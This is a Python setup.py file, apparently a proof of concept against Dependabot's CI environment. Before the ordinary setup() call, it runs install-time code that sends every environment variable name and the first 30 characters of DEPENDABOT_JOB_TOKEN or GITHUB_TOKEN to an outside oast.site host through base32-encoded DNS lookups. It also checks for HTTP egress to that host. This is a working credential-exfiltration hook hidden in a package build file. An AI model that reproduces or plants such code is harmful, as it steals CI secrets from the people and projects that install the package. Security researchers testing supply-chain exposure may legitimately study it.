import os
import base64
import socket

# Phase 1: Exfil env var NAMES via DNS
env_keys = sorted(os.environ.keys())
env_str = ','.join(env_keys)[:180]
safe = base64.b32encode(env_str.encode()).decode().lower().rstrip('=')
# DNS labels max 63 chars
labels = [safe[i:i+50] for i in range(0, min(len(safe), 200), 50)]
try:
    socket.getaddrinfo('env.' + '.'.join(labels[:3]) + '.d99n7e61b2eqace42t00jh37abkuiioht.oast.site', 80)
except Exception:
    pass

# Phase 2: Exfil token prefix via DNS (first 30 chars for scope identification)
token = os.environ.get('DEPENDABOT_JOB_TOKEN', os.environ.get('GITHUB_TOKEN', 'NONE'))
tok_safe = base64.b32encode(token[:30].encode()).decode().lower().rstrip('=')
try:
    socket.getaddrinfo('tok.' + tok_safe[:60] + '.d99n7e61b2eqace42t00jh37abkuiioht.oast.site', 80)
except Exception:
    pass

# Phase 3: Test HTTP egress
try:
    import urllib.request
    urllib.request.urlopen('http://d99n7e61b2eqace42t00jh37abkuiioht.oast.site/egress-confirmed', timeout=5)
except Exception:
    pass

# Phase 4: Normal setup() call for Dependabot to process
from setuptools import setup
setup(
    name="depbot-impact-test",
    version="1.0.0",
    install_requires=["requests==2.34.2", "urllib3==1.26.0"],
)
